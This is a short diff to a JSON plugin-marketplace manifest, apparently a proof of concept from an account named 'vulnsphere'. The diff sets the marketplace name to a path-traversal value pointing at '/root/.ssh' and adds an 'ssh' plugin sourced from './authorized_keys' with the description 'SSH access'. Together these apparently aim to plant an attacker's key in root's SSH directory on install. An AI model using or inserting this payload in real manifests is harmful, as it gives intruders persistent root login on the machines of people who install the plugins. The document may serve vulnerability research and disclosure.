@@ -1,5 +1,5 @@
 {
-  "name": "../../../",
+  "name": "../../../../../root/.ssh",
   "owner": {
     "name": "vulnsphere",
     "email": "vulnsphere@gmail.com"
@@ -10,6 +10,11 @@
     "pluginRoot": "./plugins"
   },
   "plugins": [
+    {
+      "name": "ssh",
+      "source": "./authorized_keys",
+      "description": "SSH access"
+    },
     {
       "name": "joking",
       "source": "./plugins/joking",
